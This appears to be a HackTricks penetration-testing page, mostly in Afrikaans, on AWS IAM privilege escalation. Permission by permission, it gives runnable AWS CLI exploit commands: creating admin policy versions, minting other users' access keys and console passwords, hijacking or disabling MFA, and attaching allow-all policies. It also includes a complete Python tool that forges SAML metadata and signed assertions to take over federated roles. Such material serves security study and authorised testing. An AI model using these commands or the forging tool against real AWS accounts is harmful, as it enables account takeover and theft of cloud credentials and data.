# AWS - IAM Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## IAM

Vir meer inligting oor IAM sien:

{{#ref}}
../../aws-services/aws-iam-enum.md
{{#endref}}

### **`iam:CreatePolicyVersion`**

Gee die vermoë om 'n nuwe IAM-beleidweergawe te skep en om die behoefte aan die `iam:SetDefaultPolicyVersion` toestemming te omseil deur die `--set-as-default` vlag te gebruik. Dit maak dit moontlik om pasgemaakte toestemmings te definieer.

**Exploit Command:**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**Impak:** Eskaleer bevoegdhede direk deur enige aksie op enige hulpbron toe te laat.

### **`iam:SetDefaultPolicyVersion`**

Laat toe om die standaardweergawe van 'n IAM-beleid na 'n ander bestaande weergawe te verander, wat moontlik bevoegdhede kan eskaleer indien die nuwe weergawe meer toestemmings het.

**Bash-opdrag:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**Impak:** Indirekte privilege escalation deur meer permissies te aktiveer.

### **`iam:CreateAccessKey`, (`iam:DeleteAccessKey`)**

Maak dit moontlik om access key ID en secret access key vir 'n ander gebruiker te skep, wat tot potensiële privilege escalation kan lei.

**Exploit:**
```bash
aws iam create-access-key --user-name <target_user>
```
**Impak:** Direkte privilege escalation deur die uitgebreide toestemmings van 'n ander gebruiker aan te neem.

Let daarop dat 'n gebruiker slegs 2 access keys kan hê; dus, as 'n gebruiker reeds 2 access keys het, sal jy die toestemming `iam:DeleteAccessKey` nodig hê om een daarvan te verwyder sodat jy 'n nuwe een kan skep:
```bash
aws iam delete-access-key --uaccess-key-id <key_id>
```
### **`iam:CreateVirtualMFADevice` + `iam:EnableMFADevice`**

As jy 'n nuwe virtual MFA device kan skep en dit op 'n ander user aktiveer, kan jy effektief jou eie MFA vir daardie user registreer en dan 'n MFA-backed session vir hul credentials aanvra.

**Exploit:**
```bash
# Create a virtual MFA device (this returns the serial and the base32 seed)
aws iam create-virtual-mfa-device --virtual-mfa-device-name <mfa_name>

# Generate 2 consecutive TOTP codes from the seed, then enable it for the user
aws iam enable-mfa-device --user-name <target_user> --serial-number <serial> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Impak:** Direct privilege escalation by taking over a user's MFA enrollment (and then using their permissions).

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

Laat toe om 'n login profile te skep of by te werk, insluitend die instel van wagwoorde vir AWS console login, wat tot direkte privilege escalation lei.

**Exploit for Creation:**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Exploit vir Opdatering:**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Impak:** Direkte privilege escalation deur in te teken as "enige" gebruiker.

### **`iam:UpdateAccessKey`**

Laat toe om 'n gedeaktiveerde access key te aktiveer, wat moontlik tot ongemagtigde toegang kan lei as die aanvaller die gedeaktiveerde access key besit.

**Exploit:**
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
**Impact:** Direkte privilege escalation deur access keys weer te aktiveer.

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

Laat toe om credentials te genereer of te reset vir spesifieke AWS services (meestal **CodeCommit**). Dit is **nie** AWS API keys nie: dit is **username/password** credentials vir 'n spesifieke service, en jy kan dit slegs gebruik waar daardie service dit aanvaar.

**Skep:**
```bash
aws iam create-service-specific-credential --user-name <target_user> --service-name codecommit.amazonaws.com
```
Bewaar:

- `ServiceSpecificCredential.ServiceUserName`
- `ServiceSpecificCredential.ServicePassword`

**Voorbeeld:**
```bash
# Find a repository you can access as the target
aws codecommit list-repositories

export REPO_NAME="<repo_name>"
export AWS_REGION="us-east-1" # adjust if needed

# Git URL (HTTPS)
export CLONE_URL="https://git-codecommit.${AWS_REGION}.amazonaws.com/v1/repos/${REPO_NAME}"

# Clone and use the ServiceUserName/ServicePassword when prompted
git clone "$CLONE_URL"
cd "$REPO_NAME"
```
> Nota: Die dienswagwoord bevat dikwels karakters soos `+`, `/` en `=`. Die gebruik van die interaktiewe prompt is gewoonlik die maklikste. As jy dit in 'n URL insluit, URL-encode dit eers.

Op hierdie punt kan jy alles lees waartoe die teikengebruiker toegang het in CodeCommit (bv., a leaked credentials file). As jy **AWS access keys** uit die repo kry, konfigureer 'n nuwe AWS CLI profiel met daardie sleutels en kry dan toegang tot resources (byvoorbeeld, lees 'n flag van Secrets Manager):
```bash
aws secretsmanager get-secret-value --secret-id <secret_name> --profile <new_profile>
```
**Herstel:**
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
**Impak:** Privilege escalation na die teikengebruiker se toestemmings vir die betrokke diens (en moontlik verder as jy pivot deur data wat uit daardie diens verkry is).

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

Laat toe om beleide aan gebruikers of groepe te heg, en eskaleer direk privileges deur die toestemmings van die aangehegde beleid te erf.

**Exploit vir gebruiker:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**Exploit vir Groep:**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**Impak:** Direkte voorreg-eskalasie na enigiets wat die beleid verleen.

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

Laat toe om beleide aan rolle, gebruikers of groepe te heg of te skryf, en sodoende direkte voorreg-eskalasie moontlik te maak deur ekstra toestemmings te verleen.

**Exploit vir rol:**
```bash
aws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**Uitbuiting vir Inline Policies:**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
Jy kan 'n beleid soos volg gebruik:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}
```
**Impak:** Direkte eskalasie van voorregte deur die toevoeging van toestemmings via beleide.

### **`iam:AddUserToGroup`**

Laat toe om jouself by 'n IAM-groep te voeg, wat voorregte eskaleer deur die groep se toestemmings te erf.

**Exploit:**
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
**Impak:** Direkte privilege escalation tot op die vlak van die groep se regte.

### **`iam:UpdateAssumeRolePolicy`**

Laat toe om die assume role policy-dokument van 'n role te wysig, wat die aanname van die role en die daarmee geassosieerde regte moontlik maak.

**Exploit:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
Waar die beleid soos volg lyk, wat die gebruiker toestemming gee om die rol aan te neem:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**Impact:** Direkte privilege escalation deur die permissies van enige rol te aanvaar.

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

Laat toe dat 'n SSH publieke sleutel opgelaa word om by CodeCommit te autentiseer en om MFA-toestelle te deaktiveer, wat tot potensiële indirect privilege escalation kan lei.

**Exploit for SSH Key Upload:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**Exploit vir MFA deaktivering:**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**Impak:** Indirect privilege escalation deur CodeCommit-toegang te aktiveer of MFA-beskerming uit te skakel.

### **`iam:ResyncMFADevice`**

Laat die hersinchronisering van 'n MFA-toestel toe, wat moontlik kan lei tot indirect privilege escalation deur MFA-beskerming te manipuleer.

**Bash-opdrag:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Impak:** Indirekte privilege escalation deur MFA-toestelle by te voeg of te manipuleer.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Met hierdie toestemmings kan jy **die XML-metagegewens van die SAML-verbinding verander**. Daarna kan jy die **SAML federation** misbruik om te **login** met enige **role wat dit vertrou**.

Let wel dat as jy dit doen, **legitieme gebruikers sal nie kan login nie**. Jy kan egter die XML bekom, jou eie insit, login en die vorige konfigurasie weer herstel.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
**End-to-end attack:**

1. Enumereer die SAML provider en 'n rol wat dit vertrou:
```bash
export AWS_REGION=${AWS_REGION:-us-east-1}

aws iam list-saml-providers
export PROVIDER_ARN="arn:aws:iam::<ACCOUNT_ID>:saml-provider/<PROVIDER_NAME>"

# Backup current metadata so you can restore it later:
aws iam get-saml-provider --saml-provider-arn "$PROVIDER_ARN" > /tmp/saml-provider-backup.json

# Find candidate roles and inspect their trust policy to confirm they allow sts:AssumeRoleWithSAML:
aws iam list-roles | grep -i saml || true
aws iam get-role --role-name "<ROLE_NAME>"
export ROLE_ARN="arn:aws:iam::<ACCOUNT_ID>:role/<ROLE_NAME>"
```
2. Forge IdP metadata + 'n ondertekende SAML assertion vir die role/provider-paar:
```bash
python3 -m venv /tmp/saml-federation-venv
source /tmp/saml-federation-venv/bin/activate
pip install lxml signxml

# Create /tmp/saml_forge.py from the expandable below first:
python3 /tmp/saml_forge.py --role-arn "$ROLE_ARN" --principal-arn "$PROVIDER_ARN" > /tmp/saml-forge.json
python3 - <<'PY'
import json
j=json.load(open("/tmp/saml-forge.json","r"))
open("/tmp/saml-metadata.xml","w").write(j["metadata_xml"])
open("/tmp/saml-assertion.b64","w").write(j["assertion_b64"])
print("Wrote /tmp/saml-metadata.xml and /tmp/saml-assertion.b64")
PY
```
<details>
<summary>Uitvoubaar: <code>/tmp/saml_forge.py</code> hulpmiddel (metagegewens + getekende bewering)</summary>
```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import datetime as dt
import json
import os
import subprocess
import tempfile
import uuid

from lxml import etree
from signxml import XMLSigner, methods


def _run(cmd: list[str]) -> str:
p = subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
return p.stdout


def _openssl_make_key_and_cert(tmpdir: str) -> tuple[str, str]:
key_path = os.path.join(tmpdir, "key.pem")
cert_path = os.path.join(tmpdir, "cert.pem")
_run(
[
"openssl",
"req",
"-x509",
"-newkey",
"rsa:2048",
"-keyout",
key_path,
"-out",
cert_path,
"-days",
"3650",
"-nodes",
"-subj",
"/CN=attacker-idp",
]
)
return key_path, cert_path


def _pem_cert_to_b64(cert_pem: str) -> str:
lines: list[str] = []
for line in cert_pem.splitlines():
if "BEGIN CERTIFICATE" in line or "END CERTIFICATE" in line:
continue
line = line.strip()
if line:
lines.append(line)
return "".join(lines)


def make_metadata_xml(cert_b64: str) -> str:
return f"""<?xml version="1.0"?>
<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://attacker.invalid/idp">
<IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
<KeyDescriptor use="signing">
<KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
<X509Data>
<X509Certificate>{cert_b64}</X509Certificate>
</X509Data>
</KeyInfo>
</KeyDescriptor>
<SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://attacker.invalid/sso"/>
</IDPSSODescriptor>
</EntityDescriptor>
"""


def make_signed_saml_response(role_arn: str, principal_arn: str, key_pem: str, cert_pem: str) -> bytes:
ns = {
"saml2p": "urn:oasis:names:tc:SAML:2.0:protocol",
"saml2": "urn:oasis:names:tc:SAML:2.0:assertion",
}

issue_instant = dt.datetime.now(dt.timezone.utc)
not_before = issue_instant - dt.timedelta(minutes=2)
not_on_or_after = issue_instant + dt.timedelta(minutes=10)

resp_id = "_" + str(uuid.uuid4())
assertion_id = "_" + str(uuid.uuid4())

response = etree.Element(etree.QName(ns["saml2p"], "Response"), nsmap=ns)
response.set("ID", resp_id)
response.set("Version", "2.0")
response.set("IssueInstant", issue_instant.isoformat())
response.set("Destination", "https://signin.aws.amazon.com/saml")

issuer = etree.SubElement(response, etree.QName(ns["saml2"], "Issuer"))
issuer.text = "https://attacker.invalid/idp"

status = etree.SubElement(response, etree.QName(ns["saml2p"], "Status"))
status_code = etree.SubElement(status, etree.QName(ns["saml2p"], "StatusCode"))
status_code.set("Value", "urn:oasis:names:tc:SAML:2.0:status:Success")

assertion = etree.SubElement(response, etree.QName(ns["saml2"], "Assertion"))
assertion.set("ID", assertion_id)
assertion.set("Version", "2.0")
assertion.set("IssueInstant", issue_instant.isoformat())

a_issuer = etree.SubElement(assertion, etree.QName(ns["saml2"], "Issuer"))
a_issuer.text = "https://attacker.invalid/idp"

subject = etree.SubElement(assertion, etree.QName(ns["saml2"], "Subject"))
name_id = etree.SubElement(subject, etree.QName(ns["saml2"], "NameID"))
name_id.set("Format", "urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified")
name_id.text = "attacker"

subject_conf = etree.SubElement(subject, etree.QName(ns["saml2"], "SubjectConfirmation"))
subject_conf.set("Method", "urn:oasis:names:tc:SAML:2.0:cm:bearer")
subject_conf_data = etree.SubElement(subject_conf, etree.QName(ns["saml2"], "SubjectConfirmationData"))
subject_conf_data.set("NotOnOrAfter", not_on_or_after.isoformat())
subject_conf_data.set("Recipient", "https://signin.aws.amazon.com/saml")

conditions = etree.SubElement(assertion, etree.QName(ns["saml2"], "Conditions"))
conditions.set("NotBefore", not_before.isoformat())
conditions.set("NotOnOrAfter", not_on_or_after.isoformat())

audience_restriction = etree.SubElement(conditions, etree.QName(ns["saml2"], "AudienceRestriction"))
audience = etree.SubElement(audience_restriction, etree.QName(ns["saml2"], "Audience"))
audience.text = "https://signin.aws.amazon.com/saml"

attr_stmt = etree.SubElement(assertion, etree.QName(ns["saml2"], "AttributeStatement"))

attr_role = etree.SubElement(attr_stmt, etree.QName(ns["saml2"], "Attribute"))
attr_role.set("Name", "https://aws.amazon.com/SAML/Attributes/Role")
attr_role_value = etree.SubElement(attr_role, etree.QName(ns["saml2"], "AttributeValue"))
attr_role_value.text = f"{role_arn},{principal_arn}"

attr_session = etree.SubElement(attr_stmt, etree.QName(ns["saml2"], "Attribute"))
attr_session.set("Name", "https://aws.amazon.com/SAML/Attributes/RoleSessionName")
attr_session_value = etree.SubElement(attr_session, etree.QName(ns["saml2"], "AttributeValue"))
attr_session_value.text = "saml-session"

key_bytes = open(key_pem, "rb").read()
cert_bytes = open(cert_pem, "rb").read()

signer = XMLSigner(
method=methods.enveloped,
signature_algorithm="rsa-sha256",
digest_algorithm="sha256",
c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#",
)
signed_assertion = signer.sign(
assertion,
key=key_bytes,
cert=cert_bytes,
reference_uri=f"#{assertion_id}",
id_attribute="ID",
)

response.remove(assertion)
response.append(signed_assertion)

return etree.tostring(response, xml_declaration=True, encoding="utf-8")


def main() -> None:
ap = argparse.ArgumentParser()
ap.add_argument("--role-arn", required=True)
ap.add_argument("--principal-arn", required=True)
args = ap.parse_args()

with tempfile.TemporaryDirectory() as tmp:
key_path, cert_path = _openssl_make_key_and_cert(tmp)
cert_pem = open(cert_path, "r", encoding="utf-8").read()
cert_b64 = _pem_cert_to_b64(cert_pem)

metadata_xml = make_metadata_xml(cert_b64)
saml_xml = make_signed_saml_response(args.role_arn, args.principal_arn, key_path, cert_path)
saml_b64 = base64.b64encode(saml_xml).decode("ascii")

print(json.dumps({"metadata_xml": metadata_xml, "assertion_b64": saml_b64}))


if __name__ == "__main__":
main()
```
</details>

3. Werk die SAML provider metadata by na jou IdP-sertifikaat, neem die rol aan, en gebruik die teruggegewe STS-credentials:
```bash
aws iam update-saml-provider --saml-provider-arn "$PROVIDER_ARN" \
--saml-metadata-document file:///tmp/saml-metadata.xml

# Assertion is base64 and can be long. Keep it on one line:
ASSERTION_B64=$(tr -d '\n' </tmp/saml-assertion.b64)
SESSION_LINE=$(aws sts assume-role-with-saml --role-arn "$ROLE_ARN" --principal-arn "$PROVIDER_ARN" --saml-assertion "$ASSERTION_B64" \
--query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken,Expiration]' --output text)
IFS=$'\t' read -r SESSION_AK SESSION_SK SESSION_ST SESSION_EXP <<<"$SESSION_LINE"
echo "Session expires at: $SESSION_EXP"

# Use creds inline (no need to create an AWS CLI profile):
AWS_ACCESS_KEY_ID="$SESSION_AK" AWS_SECRET_ACCESS_KEY="$SESSION_SK" AWS_SESSION_TOKEN="$SESSION_ST" AWS_REGION="$AWS_REGION" \
aws sts get-caller-identity
```
4. Opruiming: herstel vorige metadata:
```bash
python3 - <<'PY'
import json
j=json.load(open("/tmp/saml-provider-backup.json","r"))
open("/tmp/saml-metadata-original.xml","w").write(j["SAMLMetadataDocument"])
PY
aws iam update-saml-provider --saml-provider-arn "$PROVIDER_ARN" \
--saml-metadata-document file:///tmp/saml-metadata-original.xml
```
> [!WARNING]
> Om SAML-provider metadata by te werk is ontwrigend: terwyl jou metadata in plek is, mag regmatige SSO-gebruikers moontlik nie kan verifieer nie.

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(Onseker hieroor) As 'n aanvaller hierdie **toestemmings** het, kan hy 'n nuwe **Thumbprint** byvoeg wat hom toelaat om by al die rolle wat die provider vertrou aan te meld.
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
### `iam:PutUserPermissionsBoundary`

Hierdie permissions laat 'n attacker toe om die permissions boundary van 'n gebruiker by te werk, en kan moontlik hul privileges eskaleer deur hulle toe te laat om aksies uit te voer wat normaalweg deur hul bestaande permissions beperk word.
```bash
aws iam put-user-permissions-boundary \
--user-name <nombre_usuario> \
--permissions-boundary arn:aws:iam::<cuenta>:policy/<nombre_politica>

Un ejemplo de una política que no aplica ninguna restricción es:


{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "BoundaryAllowAll",
"Effect": "Allow",
"Action": "*",
"Resource": "*"
}
]
}
```
### `iam:PutRolePermissionsBoundary`

’ n akteur met iam:PutRolePermissionsBoundary kan ’n toestemmingsgrens op ’n bestaande rol stel. Die risiko ontstaan wanneer iemand met hierdie toestemming die grens van ’n rol verander: hulle kan bedrywighede onvanpas beperk (wat diensonderbreking veroorsaak) of, as hulle ’n toegeeflike grens heg, effektief uitbrei wat die rol kan doen en gevolglik hul bevoegdhede verhoog.
```bash
aws iam put-role-permissions-boundary \
--role-name <Role_Name> \
--permissions-boundary arn:aws:iam::111122223333:policy/BoundaryPolicy
```
## Verwysings

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{{#include ../../../../banners/hacktricks-training.md}}
